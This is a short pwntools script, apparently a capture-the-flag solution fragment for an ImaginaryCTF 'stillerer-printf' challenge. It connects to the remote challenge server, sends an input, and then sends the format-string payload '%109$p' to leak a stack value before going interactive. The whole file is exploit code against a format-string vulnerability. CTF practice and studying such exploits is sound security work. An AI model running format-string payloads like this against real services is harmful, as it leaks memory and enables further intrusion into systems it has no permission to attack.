#!/usr/bin/env python3
from pwn import *
exe = ELF('vuln', checksec = False)

# p = process(exe.path, aslr=False)
p = remote('stillerer-printf.chal.imaginaryctf.org', 1337)

input()
p.sendline(b'767')
p.sendline(f'%109$p'.encode())


p.interactive()